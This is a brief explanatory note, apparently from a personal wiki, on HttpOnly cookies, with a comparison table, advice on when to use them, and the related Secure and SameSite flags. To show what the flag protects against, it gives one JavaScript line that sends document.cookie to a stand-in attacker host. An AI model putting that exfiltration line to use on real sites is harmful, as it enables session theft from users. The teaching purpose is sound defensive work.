An **HttpOnly cookie** is just a [[cookie]] with a special flag:

```http
Set-Cookie: sessionId=abc123; HttpOnly
```


### What changes?

* ❌ **Not accessible via JavaScript (`document.cookie`)**
* ✅ Only sent via HTTP/HTTPS requests to the server

---

## ⚔️ Main Difference

| Feature            | Normal Cookie 🍪 | HttpOnly Cookie 🔒 |
| ------------------ | ---------------- | ------------------ |
| Accessible via JS  | ✅ Yes            | ❌ No               |
| Sent with requests | ✅ Yes            | ✅ Yes              |
| Protection vs XSS  | ❌ No             | ✅ Yes              |

---

### Without HttpOnly:

If your site has an XSS vulnerability, an attacker can do:

```js
fetch("https://attacker.com?cookie=" + document.cookie)
```

👉 Your session cookie gets stolen.

---

### With HttpOnly:

```js
document.cookie // cannot access sessionId
```

👉 Even if XSS exists, attacker **cannot read the cookie**.

---

## 🧩 When to Use What?


**Use cases:**

### ✅ Use HttpOnly cookies for:

* Session management (login sessions)
* Authentication (JWT, session ID)
* Anything sensitive
* Refresh tokens (secure storage)
* CSRF protection (with SameSite)
### ⚠️ Use normal cookies only if:

* You explicitly need JS access (rare cases)
* Example: storing UI preferences

---

## 🔁 Related Flags (Important)

Usually HttpOnly is combined with:

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

* **Secure** → only sent over HTTPS
* **SameSite** → prevents CSRF attacks


